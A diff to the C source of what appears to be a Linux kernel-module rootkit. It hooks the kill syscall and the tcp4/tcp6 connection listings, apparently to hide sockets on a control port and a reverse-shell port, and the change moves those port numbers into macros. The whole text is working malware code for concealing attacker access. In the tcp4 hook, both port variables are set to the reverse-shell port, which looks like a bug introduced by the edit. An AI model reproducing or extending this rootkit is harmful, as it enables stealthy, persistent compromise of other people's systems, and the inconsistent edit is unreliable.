@@ -8,6 +8,9 @@
 #include <linux/tcp.h>
 #include <linux/version.h>
 
+#define REV_SHELL_PORT 1339
+#define COMM_PORT 1337
+
 #ifdef CONFIG_X86_64
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 17, 0)
 #define PTREGS_SYSCALL_STUB 1
@@ -103,7 +106,7 @@ static asmlinkage long hook_kill(pid_t pid, int sig) {
 
 static asmlinkage long hook_tcp6(struct seq_file *seq, void *v) {
   struct inet_sock *sock;
-  unsigned short communication_port = htons(1337);
+  unsigned short communication_port = htons(COMM_PORT);
 
   if (v != SEQ_START_TOKEN) {
     sock = (struct inet_sock *)v;
@@ -117,8 +120,8 @@ static asmlinkage long hook_tcp6(struct seq_file *seq, void *v) {
 
 static asmlinkage long hook_tcp4(struct seq_file *seq, void *v) {
   struct inet_sock *sock;
-  unsigned short communication_port = htons(1337);
-  unsigned short revshell_port = htons(1338);
+  unsigned short communication_port = htons(REV_SHELL_PORT);
+  unsigned short revshell_port = htons(REV_SHELL_PORT);
 
   if (v != SEQ_START_TOKEN) {
     sock = (struct inet_sock *)v;
